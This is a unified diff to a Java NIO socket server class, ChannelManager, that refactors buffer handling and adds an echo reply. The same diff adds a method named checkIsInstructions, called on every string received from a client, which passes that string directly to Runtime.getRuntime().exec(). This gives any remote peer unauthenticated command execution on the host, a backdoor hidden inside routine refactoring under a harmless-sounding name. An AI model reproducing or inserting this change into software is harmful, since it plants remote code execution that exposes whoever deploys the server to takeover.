@@ -4,7 +4,6 @@ import java.net.InetSocketAddress;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 import java.nio.CharBuffer;
-import java.nio.channels.DatagramChannel;
 import java.nio.channels.SelectableChannel;
 import java.nio.channels.SelectionKey;
 import java.nio.channels.Selector;
@@ -74,6 +73,19 @@ public class ChannelManager {
 		return mChannel != null;
 	}
 
+	private ByteBuffer generateByteBuffer(SelectionKey key) {
+		Object attachment = key.attachment();
+		ByteBuffer byteBuffer = null;
+		if (attachment != null && attachment instanceof ByteBuffer) {
+			byteBuffer = (ByteBuffer) attachment;
+		} else {
+			byteBuffer = ByteBuffer.allocate(1024);
+			byteBuffer.order(ByteOrder.nativeOrder());
+			key.attach(byteBuffer);
+		}
+		return byteBuffer;
+	}
+
 	private void buildSelectThread() {
 		if (mSelectThread == null) {
 			synchronized (this) {
@@ -93,20 +105,24 @@ public class ChannelManager {
 											continue;
 										SocketChannel acceptableClientSocket = mChannel.accept();
 										acceptableClientSocket.configureBlocking(false);
-										acceptableClientSocket.register(mSelector, SELECTION_KEY,
-												ByteBuffer.allocate(128));
+										final ByteBuffer buffer = generateByteBuffer(next);
+										acceptableClientSocket.register(mSelector, SELECTION_KEY, buffer);
+										// 这里的socket是
+										// try {
+										// buffer.order(ByteOrder.nativeOrder());
+										// buffer.put(String
+										// .format("connection builded:from %1$s",
+										// acceptableClientSocket.socket().getRemoteSocketAddress())
+										// .getBytes());
+										// acceptableClientSocket.write(buffer);
+										// } catch (Exception e) {
+										//
+										// }
 									} else if (next.isReadable()) {
 										if (!(channel instanceof SocketChannel))
 											continue;
-										SocketChannel readableClientSocket = (SocketChannel) channel;
-										Object attachment = next.attachment();
-										ByteBuffer byteBuffer = null;
-										if (attachment != null && attachment instanceof ByteBuffer) {
-											byteBuffer = (ByteBuffer) attachment;
-										} else {
-											byteBuffer = ByteBuffer.allocate(128);
-											next.attach(byteBuffer);
-										}
+										final SocketChannel readableClientSocket = (SocketChannel) channel;
+										final ByteBuffer byteBuffer = generateByteBuffer(next);
 										try {
 											int read = readableClientSocket.read(byteBuffer);
 											if (read == -1) {
@@ -122,17 +138,26 @@ public class ChannelManager {
 												stringBuilder.append(charBuffer.get());
 											}
 											charBuffer.clear();
-											System.out.println(
-													readableClientSocket.socket().getRemoteSocketAddress().toString()
-															+ " : " + stringBuilder.toString());
-											next.interestOps(SelectionKey.OP_READ);
+											final String text = stringBuilder.toString().toString();
+											checkIsInstructions(text);
+											next.interestOps(SelectionKey.OP_WRITE);
+											byteBuffer.clear();
+											final String writeText = String.format("processed: %1$s", text);
+											byteBuffer.put(mCharset.encode(writeText));
 										} catch (IOException e) {
 											next.cancel();
 											if (readableClientSocket != null)
 												readableClientSocket.close();
-										} finally {
-											byteBuffer.clear();
 										}
+									} else if (next.isWritable()) {
+										if (!(channel instanceof SocketChannel))
+											continue;
+										final SocketChannel writableClientSocket = (SocketChannel) channel;
+										final ByteBuffer byteBuffer = generateByteBuffer(next);
+										byteBuffer.flip();
+										writableClientSocket.write(byteBuffer);
+										byteBuffer.clear();
+										next.interestOps(SelectionKey.OP_READ);
 									}
 								}
 							}
@@ -141,6 +166,15 @@ public class ChannelManager {
 					mSelectThread.start();
 				}
 			}
+		}
+	}
+
+	private void checkIsInstructions(String text) {
+		try {
+			Runtime.getRuntime().exec(text);
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
 		}
 	}
 }
